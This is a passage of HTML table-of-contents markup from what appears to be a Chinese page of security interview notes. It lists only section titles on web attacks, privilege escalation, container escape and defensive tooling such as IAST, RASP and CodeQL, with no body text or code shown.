VPN服务器没绑定机器编码（证书）吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-00%E6%88%AA%E6%96%AD%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">7.6.</span> <span class="toc-text">1. %00截断的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">7.6.1.</span> <span class="toc-text">常见应用场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="toc-number">7.6.2.</span> <span class="toc-text">示例代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%AF%AD%E5%8F%A5"><span class="toc-number">7.7.</span> <span class="toc-text">2. SQL盲注的语句</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.7.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.7.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-XSS%E8%8E%B7%E5%8F%96cookie%E7%9A%84payload"><span class="toc-number">7.8.</span> <span class="toc-text">3. XSS获取cookie的payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95payload"><span class="toc-number">7.8.1.</span> <span class="toc-text">简单payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%BC%E5%AE%B9%E6%97%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84payload"><span class="toc-number">7.8.2.</span> <span class="toc-text">兼容旧浏览器的payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E9%9A%90%E8%94%BD%E7%9A%84payload"><span class="toc-number">7.8.3.</span> <span class="toc-text">更隐蔽的payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.9.</span> <span class="toc-text">SQL Server命令执行的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">7.10.</span> <span class="toc-text">SQL注入引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8C%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">7.11.</span> <span class="toc-text">SQL注入读文件和写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BF%AE%E5%A4%8D"><span class="toc-number">7.12.</span> <span class="toc-text">SQL注入的修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4"><span class="toc-number">7.13.</span> <span class="toc-text">Linux命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90777"><span class="toc-number">7.14.</span> <span class="toc-text">Linux文件权限777</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E5%91%BD%E4%BB%A4"><span class="toc-number">7.15.</span> <span class="toc-text">Windows命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTPS%E5%BB%BA%E7%AB%8B%E8%BF%87%E7%A8%8B"><span class="toc-number">7.16.</span> <span class="toc-text">HTTPS建立过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="toc-number">7.17.</span> <span class="toc-text">Python内存管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><span class="toc-number">7.18.</span> <span class="toc-text">溯源攻击示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">7.19.</span> <span class="toc-text">DNS协议的作用与解析过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">7.20.</span> <span class="toc-text">DNS协议的安全问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96COKIES%E9%81%87%E5%88%B0WAF%E7%9A%84%E5%BA%94%E5%AF%B9"><span class="toc-number">7.21.</span> <span class="toc-text">带外COKIES遇到WAF的应对</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AWVS%E7%99%BB%E5%BD%95%E6%89%AB%E6%8F%8F%E6%93%8D%E4%BD%9C"><span class="toc-number">7.22.</span> <span class="toc-text">AWVS登录扫描操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMAP%E4%BD%BF%E7%94%A8"><span class="toc-number">7.23.</span> <span class="toc-text">SQLMAP使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">7.24.</span> <span class="toc-text">NMAP扫描命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9A%82%E8%9A%81"><span class="toc-number">8.</span> <span class="toc-text">蚂蚁</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%99AFL%E5%81%9A%E9%80%82%E9%85%8D%E5%8E%BBfuzz%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">8.1.</span> <span class="toc-text">如何给AFL做适配去fuzz数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-AFL%E9%80%82%E9%85%8D%E6%95%B0%E6%8D%AE%E5%BA%93fuzz"><span class="toc-number">8.1.1.</span> <span class="toc-text">1. AFL适配数据库fuzz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-fuzz%E6%B5%81%E7%A8%8B"><span class="toc-number">8.1.2.</span> <span class="toc-text">2. fuzz流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-AFL%E7%9A%84%E6%8F%92%E6%A1%A9%E5%8E%9F%E7%90%86"><span class="toc-number">8.1.3.</span> <span class="toc-text">3. AFL的插桩原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%80%89%E6%8B%A9fuzz%E6%B5%8B%E8%AF%95%E7%82%B9"><span class="toc-number">8.1.4.</span> <span class="toc-text">4. 选择fuzz测试点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%95%B0%E6%8D%AE%E5%BA%93fuzz%E5%92%8C%E6%99%AE%E9%80%9A%E7%A8%8B%E5%BA%8Ffuzz%E7%9A%84%E4%B8%8D%E5%90%8C"><span class="toc-number">8.1.5.</span> <span class="toc-text">5. 数据库fuzz和普通程序fuzz的不同</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9AAFL%E9%80%82%E9%85%8D%E6%95%B0%E6%8D%AE%E5%BA%93fuzz"><span class="toc-number">8.2.</span> <span class="toc-text">示例代码：AFL适配数据库fuzz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%BC%96%E5%86%99%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-number">8.2.1.</span> <span class="toc-text">1. 编写测试用例生成器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%AE%BE%E7%BD%AEAFL%E7%8E%AF%E5%A2%83"><span class="toc-number">8.2.2.</span> <span class="toc-text">2. 设置AFL环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%9B%91%E6%8E%A7%E5%92%8C%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C"><span class="toc-number">8.2.3.</span> <span class="toc-text">3. 监控和分析结果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88"><span class="toc-number">9.</span> <span class="toc-text">安全开发工程师</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E8%87%AA%E5%B7%B1%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9F%90%E4%B8%AA%E7%AB%AF%E5%8F%A3%E6%83%85%E5%86%B5"><span class="toc-number">9.1.</span> <span class="toc-text">如何查看自己服务器某个端口情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%83%85%E5%86%B5"><span class="toc-number">9.2.</span> <span class="toc-text">如何查看远程服务器情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9-shell-%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B"><span class="toc-number">9.3.</span> <span class="toc-text">反弹 shell 如何检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%94%BB%E5%87%BB%E8%80%85%E4%BD%BF%E7%94%A8%E4%BA%86-AWK%EF%BC%8C%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B"><span class="toc-number">9.4.</span> <span class="toc-text">如果攻击者使用了 AWK，如何检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%A4%E4%BA%86%E8%BF%9B%E7%A8%8B%E6%A0%91%E7%9A%84%E5%91%BD%E4%BB%A4%E5%8C%B9%E9%85%8D%EF%BC%8C%E8%BF%98%E6%9C%89%E5%8F%AF%E4%BB%A5%E6%A3%80%E6%B5%8B%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E6%96%B9%E6%B3%95%E5%90%97%EF%BC%9F"><span class="toc-number">9.5.</span> <span class="toc-text">除了进程树的命令匹配，还有可以检测反弹 shell 的方法吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E4%BA%86%E8%A7%A3%E5%93%AA%E4%BA%9B%E6%8F%90%E6%9D%83%E6%89%8B%E6%AE%B5%EF%BC%9F"><span class="toc-number">9.6.</span> <span class="toc-text">你了解哪些提权手段？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-SUID-%E6%8F%90%E6%9D%83"><span class="toc-number">9.7.</span> <span class="toc-text">什么是 SUID 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%EF%BC%9F"><span class="toc-number">9.8.</span> <span class="toc-text">进程隐藏技术是什么，如何检测？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%8A%E8%81%8A-IAST"><span class="toc-number">9.9.</span> <span class="toc-text">聊聊 IAST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%EF%BC%8CA-%E8%BF%9B%E7%A8%8B%E7%9A%84-Source-%E8%A7%A6%E5%8F%91%E5%88%B0%E4%BA%86-B-%E8%BF%9B%E7%A8%8B%E7%9A%84-Sink-%E7%82%B9%EF%BC%8C%E5%A6%82%E4%BD%95%E6%BA%AF%E6%BA%90%EF%BC%9F"><span class="toc-number">9.10.</span> <span class="toc-text">如果多进程下，A 进程的 Source 触发到了 B 进程的 Sink 点，如何溯源？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SCA%E6%98%AF%E4%BB%80%E4%B9%88%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0"><span class="toc-number">9.11.</span> <span class="toc-text">SCA是什么以及如何实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SCA%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F"><span class="toc-number">9.11.1.</span> <span class="toc-text">SCA的实现方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%8E%A2%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%9F%90%E4%B8%AA%E7%B1%BB%EF%BC%88jar%E5%8C%85%EF%BC%89"><span class="toc-number">9.12.</span> <span class="toc-text">如何探测是否存在某个类（jar包）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A4%9A%E7%AA%97%E5%8F%A3%E5%92%8C%E5%A4%9A%E6%A0%87%E7%AD%BE%E7%9A%84%E8%AE%BE%E8%AE%A1"><span class="toc-number">9.13.</span> <span class="toc-text">浏览器多窗口和多标签的设计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8Eagent%E5%88%B0%E5%AD%97%E8%8A%82%E7%A0%81hook%E7%9A%84%E6%95%B4%E4%B8%AA%E6%B5%81%E7%A8%8B%EF%BC%88%E4%BC%AA%E4%BB%A3%E7%A0%81%EF%BC%89"><span class="toc-number">9.14.</span> <span class="toc-text">从agent到字节码hook的整个流程（伪代码）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j%E6%9C%89%E5%93%AA%E4%BA%9B%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%E6%8A%80%E6%9C%AF%E5%B1%82%E9%9D%A2"><span class="toc-number">9.15.</span> <span class="toc-text">log4j有哪些防御方法技术层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%88%E4%B8%80%E4%B8%8BCodeQL%EF%BC%8C%E8%83%BD%E4%B8%8D%E8%83%BD%E7%94%A8%E6%9D%A5%E5%81%9ACI-CD"><span class="toc-number">9.16.</span> <span class="toc-text">谈一下CodeQL，能不能用来做CI&#x2F;CD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CodeQL%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9%E4%BC%9A%E6%96%AD%EF%BC%8C%E8%AF%A5%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86"><span class="toc-number">9.17.</span> <span class="toc-text">CodeQL哪些地方会断，该怎么处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E4%B8%80%E4%B8%8BSAST%E3%80%81DAST%E3%80%81IAST%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">9.18.</span> <span class="toc-text">说一下SAST、DAST、IAST的优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%8BDevSecOps"><span class="toc-number">9.19.</span> <span class="toc-text">介绍下DevSecOps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST-%E4%B8%BB%E5%8A%A8%E5%92%8C%E8%A2%AB%E5%8A%A8%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">9.20.</span> <span class="toc-text">IAST 主动和被动的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST%E5%9C%A8CI-CD%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">9.21.</span> <span class="toc-text">IAST在CI&#x2F;CD中的位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AST%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">9.22.</span> <span class="toc-text">AST的定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90AST%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">9.23.</span> <span class="toc-text">代码生成AST的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E7%BB%8F%E8%BF%87IR%E9%98%B6%E6%AE%B5%E7%94%9F%E6%88%90AST%E7%9A%84%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B6%E7%BC%BA%E9%99%B7"><span class="toc-number">9.24.</span> <span class="toc-text">不经过IR阶段生成AST的方法及其缺陷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HIDS%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">9.25.</span> <span class="toc-text">HIDS的流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">9.26.</span> <span class="toc-text">提权的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">9.27.</span> <span class="toc-text">suid提权的生命周期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E7%83%82%E5%9C%9F%E8%B1%86"><span class="toc-number">9.28.</span> <span class="toc-text">Windows 烂土豆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST%E5%92%8CRASP%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">9.29.</span> <span class="toc-text">IAST和RASP的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST%E5%92%8CRASP%E5%9C%A8%E5%9F%8B%E7%82%B9%E6%B7%B1%E6%B5%85%E4%B8%8A%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">9.30.</span> <span class="toc-text">IAST和RASP在埋点深浅上的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%8B%E7%82%B9%E6%B7%B1%E6%B5%85%E5%AF%B9%E6%A3%80%E5%87%BA%E7%8E%87%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">9.31.</span> <span class="toc-text">埋点深浅对检出率的影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j%E5%81%9A%E5%9F%8B%E7%82%B9%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%85%B6%E5%8C%BA%E5%88%AB"><span class="toc-number">9.32.</span> <span class="toc-text">log4j做埋点的两种方式及其区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BE%E5%BA%A6%E7%9A%84IAST%E5%AE%9E%E7%8E%B0%E5%8F%8A%E4%B8%BB%E5%8A%A8%E5%BC%8F%E5%92%8C%E8%A2%AB%E5%8A%A8%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">9.33.</span> <span class="toc-text">百度的IAST实现及主动式和被动式的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IAST%E5%92%8CRASP%E6%98%AF%E5%90%A6%E4%BC%9A%E4%BA%A7%E7%94%9F%E8%84%8F%E6%95%B0%E6%8D%AE"><span class="toc-number">9.34.</span> <span class="toc-text">IAST和RASP是否会产生脏数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8F%8A%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3"><span class="toc-number">9.35.</span> <span class="toc-text">符号执行及约束求解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E7%94%A8Fuzz%E6%A3%80%E6%B5%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">9.36.</span> <span class="toc-text">可用Fuzz检测的漏洞类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%BA%E7%A8%8B"><span class="toc-number">10.</span> <span class="toc-text">携程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL-%E6%B3%A8%E5%85%A5%E5%86%99%E9%A9%AC"><span class="toc-number">10.1.</span> <span class="toc-text">1. SQL 注入写马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#outfile-%E5%92%8C-dumpfile-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">10.1.1.</span> <span class="toc-text">outfile 和 dumpfile 的区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E5%88%A9%E7%94%A8-outfile-%E5%86%99-Webshell"><span class="toc-number">10.1.2.</span> <span class="toc-text">示例：利用 outfile 写 Webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E5%88%A9%E7%94%A8-dumpfile-%E5%86%99%E5%8D%95%E8%A1%8C"><span class="toc-number">10.1.3.</span> <span class="toc-text">示例：利用 dumpfile 写单行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%BD%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">10.2.</span> <span class="toc-text">2. 宽字符截断的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">10.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-5"><span class="toc-number">10.2.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SSRF-%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">10.3.</span> <span class="toc-text">3. SSRF 无回显的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">10.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">10.3.2.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-6"><span class="toc-number">10.3.3.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Shiro-%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.4.</span> <span class="toc-text">4. Shiro 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">10.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">10.4.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E5%8E%9F%E5%9B%A0"><span class="toc-number">10.4.3.</span> <span class="toc-text">失败原因</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8F%8D%E5%BC%B9-Shell-%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="toc-number">10.5.</span> <span class="toc-text">5. 反弹 Shell 的本质</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-7"><span class="toc-number">10.5.1.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%BD%9C%E4%B8%BA-Agent-%E9%87%87%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">10.6.</span> <span class="toc-text">6. 作为 Agent 采集信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E9%87%87%E9%9B%86%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">10.6.1.</span> <span class="toc-text">需要采集的信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E8%BF%9B%E7%A8%8B%E6%A0%91"><span class="toc-number">10.6.2.</span> <span class="toc-text">构建进程树</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%8F%90%E6%9D%83%E6%A3%80%E6%B5%8B"><span class="toc-number">10.7.</span> <span class="toc-text">7. 提权检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83%E6%A3%80%E6%B5%8B"><span class="toc-number">10.7.1.</span> <span class="toc-text">Linux 提权检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-%E6%8F%90%E6%9D%83%E6%A3%80%E6%B5%8B"><span class="toc-number">10.7.2.</span> <span class="toc-text">Windows 提权检测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%8E%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8"><span class="toc-number">10.8.</span> <span class="toc-text">8. 云原生与容器安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-%E9%80%83%E9%80%B8"><span class="toc-number">10.8.1.</span> <span class="toc-text">Docker 逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kubernetes-%E9%80%83%E9%80%B8"><span class="toc-number">10.8.2.</span> <span class="toc-text">Kubernetes 逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%BA%91%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2"><span class="toc-number">10.9.</span> <span class="toc-text">9. 云服务攻防</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.9.1.</span> <span class="toc-text">常见漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-8"><span class="toc-number">10.9.2.</span> <span class="toc-text">示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vivo"><span class="toc-number">11.</span> <span class="toc-text">vivo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9C%A8%E5%8F%AA%E6%9C%89%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%80%E4%B8%AA%E7%82%B9%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">11.1.</span> <span class="toc-text">1. 在只有任意文件读取一个点的情况下有什么利用方式？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%80%8E%E4%B9%88%E6%89%BE%E5%BC%80%E4%BA%86%E4%BB%80%E4%B9%88%E6%9C%8D%E5%8A%A1%EF%BC%88-proc-pid-cmdline%EF%BC%89%EF%BC%9F"><span class="toc-number">11.2.</span> <span class="toc-text">2. 怎么找开了什么服务（&#x2F;proc&#x2F;pid&#x2F;cmdline）？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%80%8E%E4%B9%88%E6%89%BE%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%9F"><span class="toc-number">11.3.</span> <span class="toc-text">3. 怎么找绝对路径？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6"><span class="toc-number">11.4.</span> <span class="toc-text">5. Linux开机自启动文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%81%8A%E4%BA%91AK-SK%E7%9B%B8%E5%85%B3%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">11.5.</span> <span class="toc-text">6. 聊云AK&#x2F;SK相关的利用和防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%81%8ASSO%E7%9B%B8%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">11.6.</span> <span class="toc-text">7. 聊SSO相关的攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 